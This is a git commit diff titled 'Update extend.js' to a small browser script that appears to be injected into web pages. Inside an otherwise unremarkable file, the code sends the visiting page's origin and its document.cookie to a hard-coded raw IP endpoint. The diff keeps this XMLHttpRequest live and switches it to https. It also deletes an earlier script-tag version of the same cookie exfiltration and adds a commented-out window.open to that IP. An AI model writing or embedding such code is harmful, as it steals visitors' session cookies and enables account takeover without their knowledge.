d698189f33efa6097005ff6f2a29eb8d76f21365
司土御帝 <1181935296@qq.com>
2020-09-12 01:43:06 +0800

    Update extend.js

--- extend.js
+++ extend.js
@@ -1,24 +1,17 @@
 (function(){
     let meta = document.createElement('meta');
     meta.content="upgrade-insecure-requests";
-    meta.http-equiv="Content-Security-Policy"
+    meta.setAttribute("http-equiv","Content-Security-Policy");
     document.getElementsByTagName('head')[0].appendChild(meta);
-    
-    
-    let script=document.createElement("script");
-    script.type="text/JavaScript";
-    script.src= "http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie;
-    document.getElementsByTagName('head')[0].appendChild(script);
-    
-    return;
     var httpRequest = new XMLHttpRequest();
-    httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
+    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
     httpRequest.send();
-    alert(1)
     httpRequest.onreadystatechange = function () {
         if (httpRequest.readyState == 4 && httpRequest.status == 200) {
             var json = httpRequest.responseText;
             console.log(json);
+        }else{
+            //window.open("https://66.70.204.147");
         }
     };
-})()
+}())
